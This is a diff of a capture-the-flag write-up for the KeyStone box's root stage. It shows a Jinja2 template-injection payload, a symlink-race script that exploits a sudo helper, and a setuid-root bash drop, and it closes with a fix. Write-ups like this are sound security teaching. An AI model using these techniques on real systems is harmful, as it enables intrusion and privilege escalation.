@@ -67,7 +67,43 @@
 
     <div class="wu-layout">
     <article class="wu-article">
-<p>Root half of KeyStone, building on the <code>tpm-admin</code> foothold from the User stage (SSTI RCE → forged <button type="button" class="wu-gloss" data-def="Trusted Platform Module: a chip (or emulated component) that stores keys and attests to system state.">TPM</button> quote → leaked SSH key).</p>
+<p>Target: <code>10.48.177.211</code> - &quot;Keystone - Attestation Portal&quot;.
+Flag format: <code>isfcr{...}</code>.</p>
+<p><strong>Status: SOLVED.</strong></p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>isfcr{a_pcr_is_a_promise_not_proof}</code></td>
+</tr>
+</tbody></table>
+<p>This is the <strong>Root</strong> half of the KeyStone boot2root. The User half (<code>/home/tpm-admin/user.txt</code>)
+is documented separately in <code>../KeyStone-User/WRITEUP.md</code>; this file covers the privilege
+escalation from <code>tpm-admin</code> to <code>root</code> and the <code>/root/root.txt</code> capture.</p>
+<hr>
+<h2 id="0-prerequisite-recap-of-the-foothold"><a class="wu-anchor" href="#0-prerequisite-recap-of-the-foothold" aria-hidden="true">#</a>0. Prerequisite (recap of the foothold)</h2>
+<p>Root requires a shell as <code>tpm-admin</code>, obtained in the User stage:</p>
+<ul>
+<li><strong>Recon:</strong> only <code>22</code> (OpenSSH 9.2p1, Debian 12) and <code>80</code> (nginx → Flask &quot;Attestation Portal&quot;)
+are open. The docs leak: the vault source at <code>/opt/vault/main.go</code>, the AK at <button type="button" class="wu-gloss" data-def="Trusted Platform Module: a chip (or emulated component) that stores keys and attests to system state.">TPM</button> handle
+<code>0x81000001</code>, a <code>sudo</code> helper <code>measure-and-run</code> that extends <strong>PCR 23</strong>, and
+<code>/etc/measure/allowed-hashes.txt</code>.</li>
+<li><strong>Portal RCE:</strong> Jinja2 SSTI in <code>/review?doc=</code> →
+<code>{{cycler.__init__.__globals__.os.popen(&#39;id&#39;).read()}}</code> → RCE as <strong><code>webapp</code></strong>
+(member of the <code>tpm</code> group).</li>
+<li><strong>Forge the attestation:</strong> <code>/opt/vault/main.go</code> verifies a client-supplied AK&#39;s quote but
+performs <strong>no credential activation</strong> (no <code>TPM2_MakeCredential</code>/<code>ActivateCredential</code> binding
+the AK to the system EK). Present your own RSA key, sign a hand-built <code>TPMS_ATTEST</code>
+(magic <code>TPM_GENERATED_VALUE</code>, type <code>TPM_ST_ATTEST_QUOTE</code>, <code>extraData == nonce</code>,
+<code>pcrDigest == SHA256(pcr0||pcr1||pcr7)</code> with all three pinned to zero) → the vault releases
+<code>tpm-admin</code>&#39;s ed25519 SSH key → <code>ssh -i tpm-admin.key tpm-admin@10.48.177.211</code>.</li>
+</ul>
+<p>Full script and detail: <code>../KeyStone-User/WRITEUP.md</code> §2 - §3.</p>
+<hr>
+<h2 id="1-enumerating-sudo-the-planted-helper"><a class="wu-anchor" href="#1-enumerating-sudo-the-planted-helper" aria-hidden="true">#</a>1. Enumerating sudo - the planted helper</h2>
 <figure class="wu-code wu-code-output" data-lines="2">
       <figcaption>
         
@@ -77,36 +113,89 @@
       <pre id="code-1"><code class="language-text">$ sudo -l
 (root) NOPASSWD: /usr/sbin/measure-and-run *</code></pre>
       
-    </figure><p>A pre-staged <code>~/race</code> directory holds <code>safe</code> (copy of <code>/bin/true</code>, allowlisted hash), <code>evil</code> (a payload dropping a setuid-root bash), and a flippable symlink <code>link -&gt; evil</code>.</p>
-<p><strong>The bug:</strong> decompiling <code>/usr/sbin/measure-and-run</code> shows it (1) opens <code>argv[1]</code> and SHA256s its contents, (2) extends PCR 23 with that hash, (3) checks the hash against <code>/etc/measure/allowed-hashes.txt</code>, (4) on match, sleeps <strong>20 ms</strong>, then (5) <strong>re-opens <code>argv[1]</code> by path a second time</strong> and <code>fexecve</code>s it. Steps 1 and 5 open the same path twice with a fixed gap - a textbook TOCTOU. If the symlink points at <code>safe</code> during the hash/allowlist check but at <code>evil</code> during the re-open, the allowlisted hash is approved while the attacker payload executes as root.</p>
-<figure class="wu-code" data-lines="6">
+    </figure><p>The <code>~/race</code> directory is pre-staged with the intended primitives:</p>
+<figure class="wu-code wu-code-output" data-lines="3">
       <figcaption>
         
-        <span class="wu-code-lang">bash</span>
+        <span class="wu-code-lang">output</span>
         <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-2"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-built_in">cd</span> /home/tpm-admin/race</span></span>
-<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">( <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span> <span class="hljs-built_in">ln</span> -sfn evil <span class="hljs-built_in">link</span>; <span class="hljs-built_in">ln</span> -sfn safe <span class="hljs-built_in">link</span>; <span class="hljs-keyword">done</span> ) &amp;</span></span>
-<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 4000); <span class="hljs-keyword">do</span></span></span>
-<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">  <span class="hljs-built_in">sudo</span> /usr/sbin/measure-and-run /home/tpm-admin/race/link &gt;/dev/null 2&gt;&amp;1</span></span>
-<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">  [ -u /tmp/rootbash ] &amp;&amp; { <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;WON after <span class="hljs-variable">$i</span>&quot;</span>; <span class="hljs-built_in">break</span>; }</span></span>
-<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc"><span class="hljs-keyword">done</span></span></span></code></pre>
+      <pre id="code-2"><code class="language-text">safe            # copy of /bin/true  (sha256 c79bf442... -&gt; ON the allowlist)
+evil            # bash payload: cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
+link -&gt; evil    # symlink we will flip</code></pre>
       
-    </figure><p>Won after 10 attempts.</p>
-<figure class="wu-code" data-lines="3">
+    </figure><h2 id="2-the-bug-toctou-double-open-in-measure-and-run"><a class="wu-anchor" href="#2-the-bug-toctou-double-open-in-measure-and-run" aria-hidden="true">#</a>2. The bug - TOCTOU double-open in <code>measure-and-run</code></h2>
+<p>Decompiling <code>/usr/sbin/measure-and-run</code> (a setuid-invoked helper) reveals:</p>
+<ol>
+<li><code>open(argv[1])</code> → <code>mmap</code> + <code>SHA256</code> the <strong>contents</strong> of that path.</li>
+<li><code>tpm2_pcrextend 23:sha256=&lt;hash&gt;</code> (extend PCR 23).</li>
+<li>Read <code>/etc/measure/allowed-hashes.txt</code>; <code>strcmp</code> the hash against each line.</li>
+<li>On match: print <code>&quot;policy ok, launching...&quot;</code>, <strong><code>usleep(20000)</code></strong> (20 ms), then</li>
+<li><strong><code>open(argv[1])</code> <em>again</em> by path</strong> → <code>fexecve()</code>.</li>
+</ol>
+<p>Steps 1 and 5 open the <strong>same path twice</strong>, separated by a fixed 20 ms sleep - a textbook
+time-of-check / time-of-use race. If <code>argv[1]</code> is a symlink that points at <code>safe</code> during the
+hash/allowlist check but at <code>evil</code> during the re-open, the <strong>allowlisted hash is approved</strong>
+yet <strong>the attacker payload is executed as root</strong>.</p>
+<h2 id="3-winning-the-race"><a class="wu-anchor" href="#3-winning-the-race" aria-hidden="true">#</a>3. Winning the race</h2>
+<p>Run the helper repeatedly against the symlink while a tight loop flips <code>link</code> between
+<code>safe</code> and <code>evil</code>:</p>
+<figure class="wu-code" data-lines="6">
       <figcaption>
         
         <span class="wu-code-lang">bash</span>
         <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-3"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">/tmp/rootbash -p -c <span class="hljs-string">&#x27;id; cat /root/root.txt&#x27;</span></span></span>
-<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-comment"># uid=1003(tpm-admin) euid=0(root)</span></span></span>
-<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-comment"># isfcr{a_pcr_is_a_promise_not_proof}</span></span></span></code></pre>
+      <pre id="code-3"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-built_in">cd</span> /home/tpm-admin/race</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">( <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span> <span class="hljs-built_in">ln</span> -sfn evil <span class="hljs-built_in">link</span>; <span class="hljs-built_in">ln</span> -sfn safe <span class="hljs-built_in">link</span>; <span class="hljs-keyword">done</span> ) &amp;   <span class="hljs-comment"># toggler</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 4000); <span class="hljs-keyword">do</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">  <span class="hljs-built_in">sudo</span> /usr/sbin/measure-and-run /home/tpm-admin/race/link &gt;/dev/null 2&gt;&amp;1</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">  [ -u /tmp/rootbash ] &amp;&amp; { <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;WON after <span class="hljs-variable">$i</span>&quot;</span>; <span class="hljs-built_in">break</span>; }</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc"><span class="hljs-keyword">done</span></span></span></code></pre>
       
-    </figure><p>Root cause and fix: open once, verify and <code>fexecve</code> the <strong>same fd</strong> - never re-resolve the path, and drop the artificial sleep. Takeaway (the flag itself): extending/checking a PCR value proves nothing about what actually runs after the measurement when the measured file can be swapped between check and use - the measurement must be bound to the executed object (fd), not the path.</p>
+    </figure><ul>
+<li><code>hash=safe</code>, <code>reopen=evil</code> → <strong>win</strong> (payload runs as root)</li>
+<li><code>hash=evil</code> → hash not on the allowlist, aborts harmlessly</li>
+<li>both <code>safe</code> → runs <code>/bin/true</code>, harmless</li>
+</ul>
+<p>Won after <strong>10 attempts</strong>. A setuid-root bash was dropped:</p>
+<figure class="wu-code" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-built_in">ls</span> -l /tmp/rootbash          <span class="hljs-comment"># -rwsr-xr-x root root</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">/tmp/rootbash -p -c <span class="hljs-string">&#x27;id; cat /root/root.txt&#x27;</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-comment"># uid=1003(tpm-admin) euid=0(root)</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc"><span class="hljs-comment"># isfcr{a_pcr_is_a_promise_not_proof}</span></span></span></code></pre>
+      
+    </figure><h2 id="4-root-cause-fix"><a class="wu-anchor" href="#4-root-cause-fix" aria-hidden="true">#</a>4. Root cause &amp; fix</h2>
+<table>
+<thead>
+<tr>
+<th>Stage</th>
+<th>Flaw</th>
+<th>Fix</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>measure-and-run</code></td>
+<td>TOCTOU: hashes a path, then <strong>re-opens it by path</strong> to <code>exec</code></td>
+<td>Open once, verify and <code>fexecve</code> the <strong>same fd</strong> (never re-resolve the path); drop the sleep</td>
+</tr>
+</tbody></table>
+<h2 id="5-takeaway"><a class="wu-anchor" href="#5-takeaway" aria-hidden="true">#</a>5. Takeaway</h2>
+<p><em>&quot;A PCR is a promise not proof&quot;</em>: extending/checking a PCR value proves nothing about what
+actually runs <em>after</em> the measurement when the measured file can be swapped between check and
+use. The measurement must be bound to the <strong>executed object</strong> (fd), not to the path.</p>
 
     </article>
-    
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#0-prerequisite-recap-of-the-foothold">0. Prerequisite (recap of the foothold)</a></li><li><a href="#1-enumerating-sudo-the-planted-helper">1. Enumerating sudo - the planted helper</a></li><li><a href="#2-the-bug-toctou-double-open-in-measure-and-run">2. The bug - TOCTOU double-open in measure-and-run</a></li><li><a href="#3-winning-the-race">3. Winning the race</a></li><li><a href="#4-root-cause-fix">4. Root cause &amp; fix</a></li><li><a href="#5-takeaway">5. Takeaway</a></li></ol>
+      </nav>
   </div>
 
   <nav class="wu-pager" aria-label="More writeups">
